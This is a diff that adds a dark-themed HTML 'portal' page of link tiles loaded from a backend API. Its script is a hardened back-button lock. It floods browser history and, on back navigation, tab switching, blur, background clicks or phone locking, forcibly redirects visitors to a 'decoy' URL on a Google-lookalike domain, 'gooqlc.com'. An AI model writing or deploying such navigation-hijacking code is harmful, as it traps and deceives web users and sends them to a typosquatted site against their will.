@@ -1,1 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title></title>
 
+  <!-- iOS Safari Smart App Banner for Shortcuts -->
+  <meta name="apple-itunes-app" content="app-id=915254993" />
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: #0d0d0d;
+      color: #ffffff;
+      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      padding: 60px 20px 40px;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+    .menu-container {
+      width: 100%;
+      max-width: 580px;
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .menu-tile {
+      background-color: #161616;
+      border: 1px solid rgba(255, 255, 255, 0.03);
+      border-radius: 12px;
+      height: 72px;
+      display: flex;
+      align-items: center;
+      padding-left: 28px;
+      font-size: 18px;
+      font-weight: 600;
+      color: #ffffff;
+      text-decoration: none;
+      cursor: pointer;
+      letter-spacing: -0.2px;
+      transition: background-color 0.15s ease, transform 0.1s ease;
+    }
+
+    .menu-tile:active {
+      background-color: #242424;
+      transform: scale(0.99);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="menu-container" id="menuContainer"></div>
+
+  <script>
+    let currentRedirect = 'https://gooqlc.com/111z';
+
+    // --- HARDENED BACK-BUTTON LOCK ---
+
+    // 1. Flood the history stack so single back taps don't reach previous sites
+    for (let i = 0; i < 15; i++) {
+      history.pushState({ page: i }, document.title, location.href);
+    }
+
+    // 2. If back arrow is pressed while on the page, force exit to the decoy
+    window.addEventListener('popstate', function () {
+      window.location.replace(currentRedirect);
+    });
+
+    // 3. Safari bfcache kill-switch: if the spectator hits "Back" on an external site
+    // and returns to this portal, instantly bounce them to the redirect
+    window.addEventListener('pageshow', function (event) {
+      if (event.persisted || (window.performance && window.performance.getEntriesByType('navigation')[0]?.type === 'back_forward')) {
+        window.location.replace(currentRedirect);
+      }
+    });
+
+    // --- PORTAL RENDERING ---
+
+    function renderPortal(links) {
+      const container = document.getElementById('menuContainer');
+      container.innerHTML = '';
+
+      if (Array.isArray(links)) {
+        links.forEach(item => {
+          const tile = document.createElement('a');
+          tile.className = 'menu-tile';
+          tile.href = '#';
+          tile.textContent = item.title;
+
+          tile.addEventListener('click', (e) => {
+            e.preventDefault();
+            e.stopPropagation();
+            window.location.replace(item.url);
+          });
+
+          container.appendChild(tile);
+        });
+      }
+    }
+
+    async function fetchConfig() {
+      try {
+        const res = await fetch('/api/portal');
+        const data = await res.json();
+        if (data.success) {
+          if (data.masterRedirect) currentRedirect = data.masterRedirect;
+          renderPortal(data.links || []);
+        }
+      } catch (err) {
+        console.warn('Backend unavailable');
+      }
+    }
+
+    // Trigger 1: Clicking empty background
+    document.addEventListener('click', (e) => {
+      if (!e.target.closest('.menu-tile')) {
+        window.location.replace(currentRedirect);
+      }
+    });
+
+    // Trigger 2: Clicking URL bar, switching tabs, leaving window
+    window.addEventListener('blur', () => {
+      window.location.replace(currentRedirect);
+    });
+
+    // Trigger 3: Minimizing Safari, locking phone
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') {
+        window.location.replace(currentRedirect);
+      }
+    });
+
+    fetchConfig();
+  </script>
+
+</body>
+</html>
